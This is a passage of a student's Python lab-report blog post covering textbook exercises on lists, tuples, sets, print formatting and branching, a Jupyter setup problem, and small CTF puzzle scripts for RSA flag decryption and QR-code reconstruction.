punctuation">,</span><span class="token string">"python"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>l1<span class="token punctuation">)</span>l1<span class="token punctuation">.</span>insert<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">"zhurong"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>l1<span class="token punctuation">)</span>l1<span class="token punctuation">.</span>insert<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>l1<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">l2<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>l2<span class="token punctuation">)</span><span class="token keyword">del</span> l2<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>l2<span class="token punctuation">)</span>l2<span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>l2<span class="token punctuation">)</span>l2<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>l2<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">list1<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>list1<span class="token punctuation">)</span>list2<span class="token operator">=</span>list1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>list2<span class="token punctuation">)</span>list3<span class="token operator">=</span>list1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>list3<span class="token punctuation">)</span>list4<span class="token operator">=</span>list1<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>list4<span class="token punctuation">)</span>list5<span class="token operator">=</span>list1<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token punctuation">(</span>list5<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">list1<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span>list2<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>list1<span class="token operator">+</span>list2<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>list1<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>list1<span class="token operator">&lt;</span>list2<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>list1<span class="token operator">&lt;</span>list2 <span class="token keyword">and</span> list1<span class="token operator">></span>list2<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">list1<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">55</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">76</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>list1<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>list1<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>list1<span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>list1<span class="token punctuation">.</span>sort<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>list1<span class="token punctuation">)</span>list1<span class="token punctuation">.</span>reverse<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>list1<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">a1<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"2019414844"</span><span class="token punctuation">,</span><span class="token string">"王静文"</span><span class="token punctuation">,</span><span class="token number">88</span><span class="token punctuation">&#125;</span><span class="token keyword">print</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span>a2<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token number">12.3</span><span class="token punctuation">,</span><span class="token number">56.7</span><span class="token punctuation">,</span><span class="token number">88.9</span><span class="token punctuation">&#125;</span><span class="token keyword">print</span><span class="token punctuation">(</span>a2<span class="token punctuation">)</span>a3<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">"一个"</span><span class="token punctuation">)</span>a4<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">"一个"</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>a3<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>a4<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">a1<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>a1<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>a1<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>a1<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">a1<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">88</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">&#125;</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">max</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">min</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>​    在这些代码里能很好的看出，课本内容的连贯性，但说实话我课上主要处理的还是一些脚本，及相关配置。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#coding=utf-8</span><span class="token keyword">import</span> hashlib<span class="token keyword">import</span> base64<span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> rsap <span class="token operator">=</span> <span class="token number">55801219744752013328353829126338788731389</span>q <span class="token operator">=</span> <span class="token number">1306404104626383868633664968881427933</span>e <span class="token operator">=</span> <span class="token number">65537</span>n <span class="token operator">=</span> <span class="token number">72898942517702846572619158917269560125985151716076557250750365689783898488937</span>d <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>key <span class="token operator">=</span> rsa<span class="token punctuation">.</span>PrivateKey<span class="token punctuation">(</span>n<span class="token punctuation">,</span>e<span class="token punctuation">,</span>d<span class="token punctuation">,</span>p<span class="token punctuation">,</span>q<span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"flag.enc"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    f <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>a<span class="token operator">=</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>rsa<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>a<span class="token punctuation">,</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​    </p><p>这一个脚本是处理一道RSA加密题目的，在网上找了类似的脚本，脚本不难理解，通过稍微改造就能适用问题，这个脚本的麻烦之处在于一些库的处理。</p><p>RSA库，base64库，gmpy2库都无法以简单的pip方式进行安装。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"1和0的故事.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">list</span><span class="token punctuation">(</span>i<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token comment"># 7*7的定位标志</span>flag <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span>img <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># 左上角定位标志</span>        <span class="token keyword">if</span> i <span class="token operator">&lt;</span> <span class="token number">7</span> <span class="token keyword">and</span> j <span class="token operator">&lt;</span> <span class="token number">7</span><span class="token punctuation">:</span>            img<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token number">1</span><span class="token punctuation">)</span>        <span class="token comment"># 左下角定位标志</span>        <span class="token keyword">elif</span> i <span class="token operator">></span> <span class="token number">17</span> <span class="token keyword">and</span> j <span class="token operator">&lt;</span> <span class="token number">7</span><span class="token punctuation">:</span>            img<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token number">1</span><span class="token punctuation">)</span>        <span class="token comment"># 右上角定位标志</span>        <span class="token keyword">elif</span> i <span class="token operator">&lt;</span> <span class="token number">7</span> <span class="token keyword">and</span> j <span class="token operator">></span> <span class="token number">17</span><span class="token punctuation">:</span>            img<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            img<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">1</span><span class="token punctuation">)</span>img<span class="token punctuation">.</span>resize<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">,</span> <span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个是一道已知01串补全二维码的脚本，在这个脚本上学到的是文件的读写和Image库作图的应用。</p><h2 id="实验二：虽然我也不知道我当时在干什么"><a href="#实验二：虽然我也不知道我当时在干什么" class="headerlink" title="实验二：虽然我也不知道我当时在干什么"></a><strong>实验二：虽然我也不知道我当时在干什么</strong></h2><p>今天上午的实验课，由于去年我已经安装和自学过python语言，完成课上的内容并没有花费很多时间，在完成课上的任务之外，我大部分的时间都在尝试安装并配置jupyter notebook的python环境。</p><p><a href="https://www.cnblogs.com/jiangfengtomhuo/p/7987419.html">配置方案</a>在CSDN里面我找到了这个配置的方案，但是在学校机房的尝试却没能成功。在我配置环境时cmd系统报错，提示环境变量的path的配置存在问题，在我将jupyter notebook对应的地址加入path变量时，cmd又报了另一个错误。由于没有保留截图，这里也无法展示，在后来请教老师也没有得出结论，后来回到宿舍在自己和舍友电脑上配置jupyter notebook想要复现当时出现问题，然而并没有出现什么问题。</p><p>最后怀疑是机房电脑是win7操作系统的原因，jupyter notebook可能没有兼容较低的windows版本。</p><p>不过整个实验课，我确实也是重新自己配置了一遍jupyter的在线编程环境，也是有所收获。</p><h2 id="实验四：Python-输出语句格式控制、顺序结构及分支结构"><a href="#实验四：Python-输出语句格式控制、顺序结构及分支结构" class="headerlink" title="实验四：Python 输出语句格式控制、顺序结构及分支结构"></a><strong>实验四：Python 输出语句格式控制、顺序结构及分支结构</strong></h2><p><strong>实验目的：</strong></p><p>1、熟练掌握 Python 输出语句格式控制符的用法。 </p><p>2、熟练判断条件表达式的真假。 </p><p>3、熟练掌握 Python 分支结构的用法。 </p><p><strong>实验内容：</strong></p><p>1、编写程序实现：课本实例 2-27，2-28，2-29，2-30，2-31，2-32。 </p><p>2-27 ：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">a<span class="token operator">=</span><span class="token number">99</span><span class="token keyword">print</span> <span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'%d'</span> <span class="token operator">%</span> a<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'%c'</span> <span class="token operator">%</span> a<span class="token punctuation">)</span>b<span class="token operator">=</span><span class="token number">3.56789</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'%f'</span> <span class="token operator">%</span> b<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"b=%f"</span> <span class="token operator">%</span> b<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'%10.3f'</span> <span class="token operator">%</span> b<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'%-10.3f'</span> <span class="token operator">%</span> b<span class="token punctuation">)</span>str1<span class="token operator">=</span><span class="token string">"Welcome to Qufu Normal University"</span><span class="token keyword">print</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'%s'</span> <span class="token operator">%</span>str1<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"string=%s"</span> <span class="token operator">%</span>str1<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"string=%10s"</span> <span class="token operator">%</span>str1<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"string=%50s"</span> <span class="token operator">%</span>str1<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"string=%+50s"</span> <span class="token operator">%</span>str1<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"string=%-50s"</span> <span class="token operator">%</span>str1<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"a=%d,b=%f,c=%s"</span> <span class="token operator">%</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>str1<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2-28 ：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">shu1<span class="token operator">=</span><span class="token number">5</span>shu2<span class="token operator">=</span><span class="token number">7</span>shu3<span class="token operator">=</span>shu1<span class="token operator">*</span>shu2<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"shu1=%d,shu2=%d,shu3=%d"</span><span class="token operator">%</span><span class="token punctuation">(</span>shu1<span class="token punctuation">,</span>shu2<span class="token punctuation">,</span>shu3<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>2-29  :</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">a<span class="token operator">=</span><span class="token string">"欢迎来到曲师大"</span>b<span class="token operator">=</span><span class="token number">123</span>c<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"a=%s,b=%d,c=%d"</span> <span class="token operator">%</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>2-30:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'请从键盘上输入任意一个数给a变量:'</span><span class="token punctuation">)</span>a<span class="token operator">=</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'请从键盘上输入任意一个数给b变量:'</span><span class="token punctuation">)</span>b<span class="token operator">=</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> a<span class="token operator">></span>b<span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"大的数为:"</span><span class="token punctuation">,</span>a<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2-31:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'请从键盘上输入任意一个数给a变量:'</span><span class="token punctuation">)</span>a<span class="token operator">=</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'请从键盘上输入任意一个数给b变量:'</span><span class="token punctuation">)</span>b<span class="token operator">=</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> a<span class="token operator">></span>b<span class="token punctuation">:</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"大的数为:"</span><span class="token punctuation">,</span>a<span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"大的数为:"</span><span class="token punctuation">,</span>b<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2-32:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'从键盘上输入一个数:'</span><span class="token punctuation">)</span>cj<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> cj<span class="token operator">>=</span><span class="token number">90</span> <span class="token keyword">and</span> cj<span class="token operator">&lt;</span><span class="token number">100</span><span class="token punctuation">:</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'优秀'</span><span class="token punctuation">)</span><span class="token keyword">elif</span> cj<span class="token operator">>=</span><span class="token number">80</span><span class="token punctuation">:</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'良好'</span><span class="token punctuation">)</span><span class="token keyword">elif</span> cj<span class="token operator">>=</span><span class="token number">70</span><span class="token punctuation">:</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'中等'</span><span class="token punctuation">)</span><span class="token keyword">elif</span> cj<span class="token operator">>=</span><span class="token number">60</span><span class="token punctuation">:</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'及格'</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'不及格'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2、编写程序实现：分别定义一个整型、实型、字符串型变量并赋值，分别用不 </p><p>同的格式符控制输出。要求：</p><p>（1）在同一个 print 语句中同时输出三个变量的名字和值；</p><p>（2）一个 print 语句输出一个变量的名字和值。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">num<span class="token operator">=</span><span class="token number">6</span>decimal<span class="token operator">=</span><span class="token number">6.6</span>string<span class="token operator">=</span><span class="token string">'6.66'</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"num=%d,decimal=%.2f,string=%s"</span> <span class="token operator">%</span><span class="token punctuation">(</span>num<span class="token punctuation">,</span>decimal<span class="token punctuation">,</span>string<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'num=%d'</span><span class="token operator">%</span>num<span class="token punctuation">)</span><span class="token 